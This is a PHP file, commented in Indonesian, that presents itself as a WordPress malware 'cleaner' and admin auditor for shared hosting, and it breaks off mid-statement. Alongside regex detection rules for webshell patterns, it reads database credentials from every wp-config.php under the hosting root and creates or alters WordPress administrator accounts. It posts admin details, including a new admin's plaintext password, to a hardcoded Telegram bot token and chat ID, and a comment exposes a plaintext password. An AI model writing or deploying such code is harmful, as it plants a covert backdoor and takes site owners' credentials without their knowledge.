<?php
declare(strict_types=1);

// DEBUG HTTP 500 - hanya menambahkan pencatatan; fitur lain tidak diubah. Passwords:ZP-Cleaner-2026!
// Simpan log di luar public_html jika memungkinkan.
$debugLog = dirname(__DIR__) . '/cleaner-debug.txt';
if (!is_dir(dirname($debugLog)) || !is_writable(dirname($debugLog))) {
    $debugLog = __DIR__ . '/cleaner-debug.txt';
}
ini_set('log_errors', '1');
ini_set('error_log', $debugLog);
ini_set('display_errors', '0');
error_reporting(E_ALL);

function cleanerDebugLog(string $message): void {
    global $debugLog;
    $line = '[' . date('Y-m-d H:i:s P') . '] ' . $message . PHP_EOL;
    @file_put_contents($debugLog, $line, FILE_APPEND | LOCK_EX);
}

cleanerDebugLog('REQUEST ' . ($_SERVER['REQUEST_METHOD'] ?? '?') .
    ' action=' . (string)($_POST['action'] ?? 'page') .
    ' PHP=' . PHP_VERSION . ' SAPI=' . PHP_SAPI);

set_error_handler(static function (int $severity, string $message, string $file, int $line): bool {
    if (!(error_reporting() & $severity)) {
        return false;
    }
    cleanerDebugLog("PHP ERROR [$severity] $message at $file:$line");
    return false; // Biarkan penanganan error PHP bawaan tetap bekerja.
});

set_exception_handler(static function (Throwable $exception): void {
    cleanerDebugLog('UNCAUGHT ' . get_class($exception) . ': ' .
        $exception->getMessage() . ' at ' . $exception->getFile() . ':' .
        $exception->getLine() . PHP_EOL . $exception->getTraceAsString());
    http_response_code(500);
    echo 'Internal server error. Periksa cleaner-debug.txt melalui File Manager.';
});

register_shutdown_function(static function (): void {
    $error = error_get_last();
    if ($error !== null && in_array($error['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR, E_USER_ERROR], true)) {
        cleanerDebugLog('FATAL [' . $error['type'] . '] ' . $error['message'] .
            ' at ' . $error['file'] . ':' . $error['line']);
    }
});


session_start();

set_time_limit(15);
ini_set('max_execution_time', '15');

// Root universal: mendeteksi struktur hosting dari lokasi script saat ini.
// Tidak bergantung pada username hosting atau nama domain tertentu.
const ROOT_DIR = __DIR__;
const EXTRA_ALLOWED_ROOTS = []; // Opsional: direktori tambahan yang memang dikelola.

function autoHostingBases(): array {
    $here = realpath(__DIR__);
    if ($here === false) return [];
    $parts = explode('/', trim($here, '/'));
    $candidates = [$here, dirname($here)];
    $cursor = '';
    foreach ($parts as $i => $part) {
        $cursor .= '/' . $part;
        // Layout umum: /home/USER/domains/DOMAIN/public_html
        // atau /home/USER/public_html/DOMAIN
        if (in_array($part, ['domains', 'public_html', 'www', 'htdocs', 'httpdocs', 'sites'], true)) {
            $candidates[] = $cursor;
        }
        // Layout VPS: /var/www/DOMAIN/html atau /srv/www/DOMAIN
        if ($i >= 1 && in_array($parts[$i - 1], ['www', 'sites'], true)) {
            $candidates[] = $cursor;
        }
    }
    // Pilih basis paling luas yang dikenali, tetapi tidak pernah /, /home, /var, /srv.
    $valid = [];
    foreach ($candidates as $candidate) {
        $real = realpath($candidate);
        if ($real === false || !is_dir($real) || is_link($candidate)) continue;
        if (in_array($real, ['/', '/home', '/var', '/srv', '/var/www'], true)) continue;
        $valid[$real] = $real;
    }
    return array_values($valid);
}
function allowedBases(): array {
    $valid = [];
    foreach ([...autoHostingBases(), ...EXTRA_ALLOWED_ROOTS] as $base) {
        $real = realpath($base);
        if ($real !== false && is_dir($real) && !is_link($base)) $valid[$real] = $real;
    }
    return array_values($valid);
}
function defaultHostingRoot(): string {
    $bases = autoHostingBases();
    foreach ($bases as $base) {
        if (preg_match('~/(?:domains|public_html|www|htdocs|httpdocs|sites)$~', $base)) return $base;
    }
    return (string)(realpath(__DIR__) ?: __DIR__);
}
function rootWithinBases(string $path): bool {
    $real = realpath($path);
    if ($real === false || !is_dir($real) || is_link($path)) return false;
    foreach (allowedBases() as $base) {
        $base = rtrim($base, '/');
        if ($real === $base || str_starts_with($real, $base . '/')) return true;
    }
    return false;
}
function activeRoot(): string {
    $selected = (string)($_SESSION['cleaner_root'] ?? ROOT_DIR);
    return rootWithinBases($selected) ? (string)realpath($selected) : (string)realpath(ROOT_DIR);
}
// Root terpisah khusus audit WordPress; tidak mengubah root scanning.
function auditRoot(): string {
    $selected = (string)($_SESSION['cleaner_audit_root'] ?? defaultHostingRoot());
    return rootWithinBases($selected) ? (string)realpath($selected) : defaultHostingRoot();
}
function auditAllowedPath(string $path): bool {
    $root = realpath(auditRoot());
    $real = realpath($path);
    if ($root === false || $real === false || is_link($path)) return false;
    $root = rtrim($root, '/');
    return $real === $root || str_starts_with($real, $root . '/');
}
function discoverRoots(): array {
    $found = [];
    foreach (allowedBases() as $base) {
        $found[$base] = $base;
        foreach ([@$base . '/domains', @$base . '/public_html'] as $candidate) {
            if (rootWithinBases($candidate)) $found[realpath($candidate)] = realpath($candidate);
        }
        foreach (@scandir($base) ?: [] as $name) {
            if ($name === '.' || $name === '..') continue;
            $candidate = $base . '/' . $name;
            if (!is_link($candidate) && is_dir($candidate) && rootWithinBases($candidate)) {
                $found[realpath($candidate)] = realpath($candidate);
                if (is_dir($candidate . '/public_html') && !is_link($candidate . '/public_html')) {
                    $found[realpath($candidate . '/public_html')] = realpath($candidate . '/public_html');
                }
            }
        }
    }
    ksort($found);
    return array_values($found);
}
const TARGET_FILE = 'wp-post.php';
const BATCH_SIZE = 50;
const MAX_SECONDS = 2.0;

/*
 * Buat hash password sekali menggunakan:
 *
 * php -r "echo password_hash('PASSWORD_ANDA', PASSWORD_DEFAULT);"
 *
 * Tempel hasilnya di bawah.
 */
const PASSWORD_HASH = '$2y$12$nqe4zLurQ80o8SesQ6Z2a.3jhABdsHylhnCg9Gh3GQyrSbeJXFybu';

function jsonResponse(array $data): never {
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store');
    echo json_encode($data);
    exit;
}

function h(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}

function db(): PDO {
    $path = __DIR__ . '/cleaner-data.sqlite';

    $db = new PDO('sqlite:' . $path);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->exec('PRAGMA busy_timeout = 5000');

    $db->exec(
        'CREATE TABLE IF NOT EXISTS queue (
            path TEXT PRIMARY KEY
        )'
    );

    $db->exec(
        'CREATE TABLE IF NOT EXISTS results (
            path TEXT PRIMARY KEY,
            kind TEXT NOT NULL,
            modified INTEGER NOT NULL
        )'
    );

    $db->exec('CREATE TABLE IF NOT EXISTS admin_baseline (site TEXT NOT NULL, user_id INTEGER NOT NULL, username TEXT NOT NULL, email TEXT NOT NULL, first_seen TEXT NOT NULL, PRIMARY KEY(site,user_id))');

    $db->exec(
        'CREATE TABLE IF NOT EXISTS stats (
            name TEXT PRIMARY KEY,
            value TEXT NOT NULL
        )'
    );

    return $db;
}

function statSet(PDO $db, string $name, string $value): void {
    $stmt = $db->prepare(
        'INSERT OR REPLACE INTO stats (name,value) VALUES (?,?)'
    );
    $stmt->execute([$name, $value]);
}

function statGet(PDO $db, string $name, string $default = '0'): string {
    $stmt = $db->prepare(
        'SELECT value FROM stats WHERE name=?'
    );
    $stmt->execute([$name]);
    return (string)($stmt->fetchColumn() ?: $default);
}

function allowedPath(string $path): bool {
    $root = realpath(activeRoot());
    $real = realpath($path);

    if ($root === false || $real === false) {
        return false;
    }

    $root = rtrim($root, DIRECTORY_SEPARATOR);

    return $real === $root ||
        str_starts_with($real, $root . DIRECTORY_SEPARATOR);
}

function countRows(PDO $db, string $table): int {
    return (int)$db->query(
        "SELECT COUNT(*) FROM {$table}"
    )->fetchColumn();
}

// Telegram: atur melalui environment hosting, bukan di dalam kode publik.
// CLEANER_TELEGRAM_BOT_TOKEN dan CLEANER_TELEGRAM_CHAT_ID.


function cleanerTelegramNotify(string $message): bool
{
    /*
    |--------------------------------------------------------------------------
    | KONFIGURASI TELEGRAM - EDIT DI SINI
    |--------------------------------------------------------------------------
    */

    $token = '8818714142:AAG2RWqxIr8nQjizU-NMZq7rtYD_SgMyBvE';
    $chat  = '8184724582';

    /*
    |--------------------------------------------------------------------------
    | SISTEM PENGIRIMAN TELEGRAM
    |--------------------------------------------------------------------------
    */

    if ($token === '' || $token === 'ISI_TOKEN_BOT_BARU' || $chat === '') {
        cleanerDebugLog(
            'TELEGRAM NOTIFY FAILED: token atau chat ID belum dikonfigurasi'
        );
        return false;
    }

    if (!function_exists('curl_init')) {
        cleanerDebugLog(
            'TELEGRAM NOTIFY FAILED: ekstensi cURL tidak tersedia'
        );
        return false;
    }

    $ch = curl_init(
        'https://api.telegram.org/bot' . $token . '/sendMessage'
    );

    if ($ch === false) {
        cleanerDebugLog(
            'TELEGRAM NOTIFY FAILED: curl_init gagal'
        );
        return false;
    }

    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'chat_id' => $chat,
            'text' => $message,
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ]);

    $response = curl_exec($ch);
    $http = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);

    curl_close($ch);

    if ($response === false) {
        cleanerDebugLog(
            'TELEGRAM NOTIFY FAILED: cURL error=' . $curlError
        );
        return false;
    }

    $data = json_decode((string) $response, true);

    if (
        $http !== 200 ||
        !is_array($data) ||
        ($data['ok'] ?? false) !== true
    ) {
        $description = is_array($data)
            ? (string) ($data['description'] ?? 'Respons Telegram tidak valid')
            : 'Respons bukan JSON valid';

        cleanerDebugLog(
            'TELEGRAM NOTIFY FAILED: HTTP=' . $http .
            ' description=' . $description
        );

        return false;
    }

    cleanerDebugLog('TELEGRAM NOTIFY SUCCESS');

    return true;
}


// Membandingkan daftar admin WordPress dengan baseline yang tersimpan.
// Pemindaian pertama membuat baseline; pemindaian selanjutnya mendeteksi ID baru.
function cleanerObserveAdmins(
    PDO $db,
    string $site,
    string $domain,
    array $users
): int {
    $stmt = $db->prepare(
        'SELECT COUNT(*) FROM admin_baseline WHERE site = ?'
    );
    $stmt->execute([$site]);

    $first = (int) $stmt->fetchColumn() === 0;

    $check = $db->prepare(
        'SELECT 1 FROM admin_baseline WHERE site = ? AND user_id = ?'
    );

    $insert = $db->prepare(
        'INSERT OR IGNORE INTO admin_baseline
        (site, user_id, username, email, first_seen)
        VALUES (?, ?, ?, ?, ?)'
    );

    $new = 0;

    foreach ($users as $u) {
        if (!isset($u['ID'], $u['user_login'], $u['user_email'])) {
            cleanerDebugLog(
                'ADMIN AUDIT SKIPPED: data user tidak lengkap'
            );
            continue;
        }

        $id = (int) $u['ID'];

        if ($id <= 0) {
            continue;
        }

        $check->execute([$site, $id]);
        $known = (bool) $check->fetchColumn();

        $insert->execute([
            $site,
            $id,
            (string) $u['user_login'],
            (string) $u['user_email'],
            date('c'),
        ]);

        if ($first || $known) {
            continue;
        }

        $new++;

        $safeDomain = preg_replace(
            '/[^A-Za-z0-9.-]/',
            '',
            $domain
        );

        $message =
            "WORDPRESS ADMIN BARU TERDETEKSI\n" .
            "Domain: " . $safeDomain . "\n" .
            "User ID: " . $id . "\n" .
            "Username: " . (string) $u['user_login'] . "\n" .
            "Email: " . (string) $u['user_email'] . "\n" .
            "Terdeteksi: " . date('c') . "\n" .
            "Password: Tidak tersedia (hash WordPress)\n" .
            "Link Login WP: https://" . $safeDomain . "/wp-login.php";

        $sent = cleanerTelegramNotify($message);

        cleanerDebugLog(
            'NEW ADMIN DETECTED domain=' . $safeDomain .
            ' user_id=' . $id .
            ' telegram=' . ($sent ? 'sent' : 'failed')
        );
    }

    return $new;
}


// Audit database hanya untuk satu instalasi yang dipilih; tidak mengeksekusi wp-config.php.
function wpConfigValue(string $source, string $key): ?string {
    $pattern = '~define\s*\(\s*[\'\"]' . preg_quote($key, '~') . '[\'\"]\s*,\s*([\'\"])((?:\\\\.|(?!\1).)*)\1\s*\)~s';
    if (!preg_match($pattern, $source, $m)) return null;
    return stripcslashes($m[2]);
}
function wpDbConnection(string $site): array {
    $site = rtrim($site, '/');
    if (!auditAllowedPath($site) || is_link($site) || !is_dir($site)) throw new RuntimeException('Direktori situs tidak valid');
    $config = $site . '/wp-config.php';
    if (!is_file($config) || is_link($config) || !auditAllowedPath($config)) throw new RuntimeException('wp-config.php tidak ditemukan');
    $source = file_get_contents($config);
    if ($source === false) throw new RuntimeException('Tidak dapat membaca wp-config.php');
    $host = wpConfigValue($source, 'DB_HOST');
    $name = wpConfigValue($source, 'DB_NAME');
    $user = wpConfigValue($source, 'DB_USER');
    $pass = wpConfigValue($source, 'DB_PASSWORD');
    if ($host === null || $name === null || $user === null || $pass === null) throw new RuntimeException('Konfigurasi database tidak standar');
    if (!preg_match('~\$table_prefix\s*=\s*[\'\"]([A-Za-z0-9_]+)[\'\"]\s*;~', $source, $m)) throw new RuntimeException('Prefix tabel tidak ditemukan');
    $prefix = $m[1];
    $pdo = new PDO('mysql:host=' . $host . ';dbname=' . $name . ';charset=utf8mb4', $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_TIMEOUT => 3,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);
    // Tidak mendukung multisite: perubahan user dapat berdampak lintas situs.
    if (is_file($site . '/wp-content/blogs.dir') || preg_match('~define\s*\(\s*[\'\"]MULTISITE[\'\"]\s*,\s*true~i', $source)) {
        throw new RuntimeException('Multisite tidak didukung untuk tindakan akun');
    }
    return [$pdo, $prefix, $site];
}

function wpAdminAudit(string $site): array {
    [$pdo, $prefix] = wpDbConnection($site);
    $sql = 'SELECT u.ID, u.user_login, u.user_email, u.user_registered '
        . 'FROM `' . $prefix . 'users` u INNER JOIN `' . $prefix . 'usermeta` m '
        . 'ON m.user_id=u.ID AND m.meta_key=:role '
        . 'WHERE m.meta_value LIKE :admin ORDER BY u.ID LIMIT 500';
    $stmt = $pdo->prepare($sql);
    $stmt->execute(['role' => $prefix . 'capabilities', 'admin' => '%"administrator"%']);
    return $stmt->fetchAll();
}



function cleanerCreateVerifiedAdmin(string $site, string $newLogin, string $newEmail, string $newPassword): array {
    [$pdo, $prefix, $site] = wpDbConnection($site);
    if (!is_file($site . '/wp-load.php') || is_link($site . '/wp-load.php') || !auditAllowedPath($site . '/wp-load.php')) {
        throw new RuntimeException('WordPress loader tidak ditemukan');
    }
    if ($newLogin === '' || !preg_match('/^[A-Za-z0-9_.@-]{3,60}$/D', $newLogin)) throw new RuntimeException('Username baru tidak valid');
    if (!filter_var($newEmail, FILTER_VALIDATE_EMAIL)) throw new RuntimeException('Email baru tidak valid');
    if (strlen($newPassword) < 6 || strlen($newPassword) > 200) throw new RuntimeException('Password baru harus 16–200 karakter');
    if (password_verify($newPassword, PASSWORD_HASH)) throw new RuntimeException('Password WordPress baru tidak boleh sama dengan password PHP Cleaner');

    // WP bootstrap hanya untuk satu situs yang dipilih dan satu permintaan.
    define('WP_USE_THEMES', false);
    require_once $site . '/wp-load.php';
    if (!function_exists('wp_authenticate') || !function_exists('wp_create_user')) throw new RuntimeException('Fungsi WordPress tidak tersedia');
    
    if (username_exists($newLogin) || email_exists($newEmail)) throw new RuntimeException('Username atau email sudah digunakan');
    $created = wp_create_user($newLogin, $newPassword, $newEmail);
    if (is_wp_error($created)) throw new RuntimeException('Gagal membuat user: ' . $created->get_error_message());
    $newUser = new WP_User((int)$created);
    $newUser->set_role('administrator');
    $domain = (string)parse_url(get_site_url(), PHP_URL_HOST);
    $loginUrl = wp_login_url();
    cleanerDebugLog('VERIFIED ADMIN CREATED domain=' . $domain . ' user_id=' . (int)$created . ' actor_id=' . (int)$actor->ID);
    $notified = cleanerTelegramNotify("Admin pemulihan dibuat\nDomain: {$domain}\nUsername: {$newLogin}\nPasswords:{$newPassword}\nEmail: {$newEmail}\nLogin WP: {$loginUrl}\nWaktu: " . date('Y-m-d H:i:s P'));
    return ['success' => true, 'message' => 'Administrator berhasil dibuat', 'notified' => $notified, 'login_url' => $loginUrl];
}

function wpAdminAction(string $site, int $id, string $action, string $confirm, string $password = '', int $reassign = 0): array {
    if ($id < 1 || !in_array($action, ['reset_password','revoke_admin','delete_admin'], true)) throw new RuntimeException('Tindakan tidak valid');
    [$pdo, $prefix, $site] = wpDbConnection($site);
    $users = '`' . $prefix . 'users`';
    $meta = '`' . $prefix . 'usermeta`';
    $posts = '`' . $prefix . 'posts`';
    $pdo->beginTransaction();
    try {
        $stmt = $pdo->prepare("SELECT ID,user_login FROM $users WHERE ID=? FOR UPDATE");
        $stmt->execute([$id]);
        $target = $stmt->fetch();
        if (!$target || $confirm !== $target['user_login']) throw new RuntimeException('Konfirmasi username tidak cocok');
        $stmt = $pdo->prepare("SELECT meta_value FROM $meta WHERE user_id=? AND meta_key=? FOR UPDATE");
        $stmt->execute([$id, $prefix . 'capabilities']);
        $role = (string)$stmt->fetchColumn();
        if (!str_contains($role, '"administrator"')) throw new RuntimeException('Akun ini bukan administrator saat ini');
        $stmt = $pdo->prepare("SELECT COUNT(DISTINCT user_id) FROM $meta WHERE meta_key=? AND meta_value LIKE ?");
        $stmt->execute([$prefix . 'capabilities', '%"administrator"%']);
        if ((int)$stmt->fetchColumn() < 2 && $action !== 'reset_password') throw new RuntimeException('Tidak boleh mencabut/menghapus administrator terakhir');
        if ($action === 'reset_password') {
            if (strlen($password) < 16 || strlen($password) > 200) throw new RuntimeException('Password harus 16–200 karakter');
            $classFile = $site . '/wp-includes/class-phpass.php';
            if (!is_file($classFile) || is_link($classFile) || !auditAllowedPath($classFile)) throw new RuntimeException('File WordPress password hasher tidak ditemukan');
            // Memuat satu kelas hashing WordPress saja; tidak bootstrap plugin/theme.
            require_once $classFile;
            if (!class_exists('PasswordHash')) throw new RuntimeException('WordPress PasswordHash tidak tersedia');
            $hasher = new PasswordHash(8, true);
            $hash = $hasher->HashPassword($password);
            $stmt = $pdo->prepare("UPDATE $users SET user_pass=?, user_activation_key='' WHERE ID=?");
            $stmt->execute([$hash, $id]);
            $result = 'Password berhasil direset';
        } elseif ($action === 'revoke_admin') {
            $stmt = $pdo->prepare("UPDATE $meta SET meta_value=? WHERE user_id=? AND meta_key=?");
            $stmt->execute([serialize(['subscriber' => true]), $id, $prefix . 'capabilities']);
            $stmt = $pdo->prepare("UPDATE $meta SET meta_value='0' WHERE user_id=? AND meta_key=?");
            $stmt->execute([$id, $prefix . 'user_level']);
            $result = 'Hak administrator dicabut';
        } else {
            if ($reassign < 1 || $reassign === $id) throw new RuntimeException('Pilih ID pemilik konten pengganti yang berbeda');
            $stmt = $pdo->prepare("SELECT ID FROM $users WHERE ID=?");
            $stmt->execute([$reassign]);
            if (!$stmt->fetchColumn()) throw new RuntimeException('ID penerima konten tidak ditemukan');
            $stmt = $pdo->prepare("UPDATE $posts SET post_author=? WHERE post_author=?");
            $stmt->execute([$reassign, $id]);
            $stmt = $pdo->prepare("DELETE FROM $meta WHERE user_id=?");
            $stmt->execute([$id]);
            $stmt = $pdo->prepare("DELETE FROM $users WHERE ID=?");
            $stmt->execute([$id]);
            $result = 'Akun dihapus, post_author dialihkan. Metadata plugin mungkin perlu pemeriksaan manual.';
        }
        $pdo->commit();
        cleanerDebugLog('ADMIN ACTION ' . $action . ' site=' . $site . ' user_id=' . $id . ' success');
        return ['success' => true, 'message' => $result];
    } catch (Throwable $e) {
        if ($pdo->inTransaction()) $pdo->rollBack();
        throw $e;
    }
}

// Heuristik: indikasi saja, bukan vonis malware. Tidak mengeksekusi file.
function suspiciousPhp(string $path): array {
    $size = @filesize($path);
    if ($size === false || $size > 2097152) return [];

    $source = @file_get_contents($path);
    if ($source === false) return [];

    $rules = [
        'eval + decoding' =>
            '~\beval\s*\(\s*(?:base64_decode|gzinflate|gzuncompress|str_rot13|hex2bin)\s*\(~i',

        'eval dinamis' =>
            '~\beval\s*\(\s*\$~i',

        'eval dengan tag PHP' =>
            '~\beval\s*\(\s*[\'"]\s*\?>\s*[\'"]\s*\.~i',

        'eval menggunakan konkatenasi' =>
            '~\beval\s*\([^;]{0,500}\.\s*\$[A-Za-z_]\w*~is',

        'assert dinamis' =>
            '~\bassert\s*\(\s*\$~i',

        'Eksekusi perintah dari request' =>
            '~\b(?:system|exec|shell_exec|passthru)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)\b~i',

        'include dari request' =>
            '~\b(?:include|require)(?:_once)?\s*\(?\s*\$_(?:GET|POST|REQUEST)\b~i',

        'penulisan PHP dari request' =>
            '~\bfile_put_contents\s*\([^;]{0,500}\$_(?:GET|POST|REQUEST)\b~is',

        'pemanggilan fungsi dinamis dari request' =>
            '~\$_(?:GET|POST|REQUEST)\s*\[[^]]+\]\s*\(~i',

        'rantai decoding obfuscated' =>
            '~(?:base64_decode|gzinflate|gzuncompress|str_rot13)\s*\(\s*(?:base64_decode|gzinflate|gzuncompress|str_rot13)\s*\(~i',

        'Remote payload: cURL + eval' =>
            '~\bcurl_exec\s*\(.*?\beval\s*\(~is',

        'Remote payload: file_get_contents + eval' =>
            '~\bfile_get_contents\s*\(.*?\beval\s*\(~is',

        'cURL dengan verifikasi SSL dimatikan' =>
            '~CURLOPT_SSL_VERIFYPEER\s*,\s*false~i',

        'cURL tanpa batas waktu' =>
            '~CURLOPT_TIMEOUT\s*,\s*0\b~i',

        'Remote code loader' =>
            '~\bfetch_remote_payload\s*\(~i',

        'Remote paste payload' =>
            '~https?://[^\s\'"]+/(?:raw|paste)/[^\s\'"]+~i',
    ];

    $hits = [];

    foreach ($rules as $name => $regex) {
        if (@preg_match($regex, $source)) {
            $hits[] = $name;
        }
    }

    return $hits;
}

function checkedResult(PDO $db, string $path): array {
    $stmt = $db->prepare('SELECT path,kind FROM results WHERE path=?');
    $stmt->execute([$path]);
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    if (!$row || is_link($path) || !is_file($path) || !allowedPath($path)) {
        throw new RuntimeException('File tidak valid atau tidak ada dalam hasil scan');
    }
    return $row;
}

function publicFileUrl(string $path): ?string {
    if (!preg_match('~/(?:domains/)?([^/]+)/public_html/(.+)$~', $path, $m)) return null;
    if (!preg_match('/^[a-z0-9.-]+$/i', $m[1])) return null;
    return 'https://' . $m[1] . '/' . implode('/', array_map('rawurlencode', explode('/', $m[2])));
}

if (isset($_POST['login_password'])) {
    if (
        PASSWORD_HASH !== 'GANTI_DENGAN_HASH_PASSWORD' &&
        password_verify(
            (string)$_POST['login_password'],
            PASSWORD_HASH
        )
    ) {
        session_regenerate_id(true);
        $_SESSION['cleaner_auth'] = true;
    } else {
        $loginError = 'Password salah atau belum dikonfigurasi.';
    }
}

if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (empty($_SESSION['cleaner_auth'])) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <meta charset="UTF-8">
    <title>Cleaner Login</title>
    <body style="font-family:Arial;background:#151923;color:white;padding:40px">
    <h2>Server PHP Cleaner</h2>
    <form method="post">
        <input type="password" name="login_password"
               placeholder="Password administrator" required>
        <button type="submit">Login</button>
    </form>
    <p><?= h($loginError ?? '') ?></p>
    </body>
    </html>
    <?php
    exit;
}

if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(random_bytes(32));
}

if (isset($_POST['action'])) {
    if (!hash_equals(
        $_SESSION['csrf'],
        (string)($_POST['csrf'] ?? '')
    )) {
        http_response_code(403);
        jsonResponse(['error' => 'CSRF tidak valid']);
    }

    try {
        $db = db();
        $action = (string)$_POST['action'];

        if ($action === 'roots') {
            jsonResponse(['roots' => discoverRoots(), 'selected' => activeRoot()]);
        }
        if ($action === 'set_root') {
            $chosen = trim((string)($_POST['root'] ?? ''));
            if (!rootWithinBases($chosen)) throw new RuntimeException('Root tidak diizinkan atau tidak tersedia');
            $_SESSION['cleaner_root'] = realpath($chosen);
            $db->exec('DELETE FROM queue');
            $db->exec('DELETE FROM results');
            $db->exec('DELETE FROM stats');
            jsonResponse(['success' => true, 'root' => activeRoot()]);
        }
        if ($action === 'audit_roots') {
            jsonResponse(['roots' => discoverRoots(), 'selected' => auditRoot()]);
        }
        if ($action === 'set_audit_root') {
            $chosen = trim((string)($_POST['root'] ?? ''));
            if (!rootWithinBases($chosen)) throw new RuntimeException('Root audit tidak tersedia atau tidak diizinkan');
            $_SESSION['cleaner_audit_root'] = (string)realpath($chosen);
            jsonResponse(['success' => true, 'root' => auditRoot()]);
        }
        if ($action === 'start') {
            $mode = (string)($_POST['mode'] ?? 'target');
            $days = max(1, min(30, (int)($_POST['days'] ?? 7)));

            if (!in_array($mode, ['target', 'recent'], true)) {
                jsonResponse(['error' => 'Mode tidak valid']);
            }

            $db->exec('DELETE FROM queue');
            $db->exec('DELETE FROM results');
            $db->exec('DELETE FROM stats');

            $stmt = $db->prepare(
                'INSERT INTO queue (path) VALUES (?)'
            );
            $stmt->execute([activeRoot()]);

            statSet($db, 'mode', $mode);
            statSet($db, 'days', (string)$days);
            statSet($db, 'scanned', '0');
            statSet($db, 'errors', '0');
            statSet($db, 'finished', '0');

            jsonResponse(['success' => true]);
        }

        if ($action === 'scan') {
            $mode = statGet($db, 'mode', 'target');
            $days = (int)statGet($db, 'days', '7');
            $scanned = (int)statGet($db, 'scanned');
            $errors = (int)statGet($db, 'errors');
            $deadline = microtime(true) + MAX_SECONDS;

            $processed = 0;

            while (
                $processed < BATCH_SIZE &&
                microtime(true) < $deadline
            ) {
                $row = $db->query(
                    'SELECT path FROM queue LIMIT 1'
                )->fetch(PDO::FETCH_ASSOC);

                if (!$row) {
                    break;
                }

                $directory = $row['path'];

                $stmt = $db->prepare(
                    'DELETE FROM queue WHERE path=?'
                );
                $stmt->execute([$directory]);

                if (
                    is_link($directory) ||
                    !allowedPath($directory) ||
                    !is_dir($directory)
                ) {
                    continue;
                }

                $items = @scandir($directory);

                if ($items === false) {
                    $errors++;
                    continue;
                }

                $insertQueue = $db->prepare(
                    'INSERT OR IGNORE INTO queue (path) VALUES (?)'
                );

                $insertResult = $db->prepare(
                    'INSERT OR IGNORE INTO results
                     (path,kind,modified) VALUES (?,?,?)'
                );

                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') {
                        continue;
                    }

                    $full = rtrim($directory, '/') . '/' . $item;

                    if (is_link($full)) {
                        continue;
                    }

                    if (is_dir($full)) {
                        if (allowedPath($full)) {
                            $insertQueue->execute([$full]);
                        }
                        continue;
                    }

                    if (!is_file($full)) {
                        continue;
                    }

                    $mtime = (int)(@filemtime($full) ?: 0);

                    if (
                        $mode === 'target' &&
                        $item === TARGET_FILE
                    ) {
                        $insertResult->execute([
                            $full, 'target', $mtime
                        ]);
                    }

                    if (
                        $mode === 'recent' &&
                        strtolower(pathinfo(
                            $item,
                            PATHINFO_EXTENSION
                        )) === 'php' &&
                        $mtime >= time() - ($days * 86400) &&
                        suspiciousPhp($full) !== []
                    ) {
                        $insertResult->execute([
                            $full, 'recent', $mtime
                        ]);
                    }
                }

                $scanned++;
                $processed++;
            }

            statSet($db, 'scanned', (string)$scanned);
            statSet($db, 'errors', (string)$errors);

            $pending = countRows($db, 'queue');
            $finished = $pending === 0;

            statSet(
                $db,
                'finished',
                $finished ? '1' : '0'
            );

            jsonResponse([
                'scanned' => $scanned,
                'pending' => $pending,
                'found' => countRows($db, 'results'),
                'errors' => $errors,
                'finished' => $finished
            ]);
        }

        if ($action === 'results') {
            $rows = $db->query(
                'SELECT path,kind,modified
                 FROM results ORDER BY path LIMIT 1000'
            )->fetchAll(PDO::FETCH_ASSOC);

            foreach ($rows as &$row) {
                $row['reasons'] = $row['kind'] === 'recent' ? suspiciousPhp($row['path']) : ['Nama file target'];
                $row['url'] = publicFileUrl($row['path']);
                $row['size'] = @filesize($row['path']) ?: 0;
            }
            unset($row);
            jsonResponse(['files' => $rows]);
        }

        if ($action === 'global_admin_audit') {
            // Audit global baca-saja, lima domain per request untuk menghindari timeout.
            $offset = max(0, (int)($_POST['offset'] ?? 0));
             $domains = [];
             $root = auditRoot();
             // Cari instalasi WordPress di bawah root yang dipilih (maksimal 6 tingkat).
             $walk = [[$root, 0]];
             while ($walk) {
                 [$dir, $depth] = array_pop($walk);
                 if (!auditAllowedPath($dir) || is_link($dir)) continue;
                 if (is_file($dir . '/wp-config.php') && !is_link($dir . '/wp-config.php')) {
                     $domains[] = $dir;
                     continue;
                 }
                 if ($depth >= 6) continue;
                 foreach (@scandir($dir) ?: [] as $entry) {
                     if ($entry === '.' || $entry === '..' || in_array($entry, ['wp-content','wp-includes','wp-admin','.git','node_modules'], true)) continue;
                     $child = $dir . '/' . $entry;
                     if (!is_link($child) && is_dir($child)) $walk[] = [$child, $depth + 1];
                 }
             }
             sort($domains, SORT_STRING);
             $batch = array_slice($domains, $offset, 5);
            $sites = [];
            foreach ($batch as $domain) {
                $site = $domain;
                 $domain = basename(dirname($site)) === 'domains' ? basename($site) : (basename($site) === 'public_html' ? basename(dirname($site)) : basename($site));
                if (!is_file($site . '/wp-config.php') || is_link($site . '/wp-config.php')) continue;
                try {
                    $users = wpAdminAudit($site);
                    $newAdmins = cleanerObserveAdmins($db, $site, $domain, $users);
                    $sites[] = ['domain' => $domain, 'site' => $site, 'users' => $users, 'new_admins' => $newAdmins];
                } catch (Throwable $e) {
                    cleanerDebugLog('GLOBAL AUDIT ' . $domain . ': ' . $e->getMessage());
                    $sites[] = ['domain' => $domain, 'site' => $site, 'error' => $e->getMessage()];
                }
            }
            jsonResponse(['sites' => $sites, 'next' => $offset + count($batch),
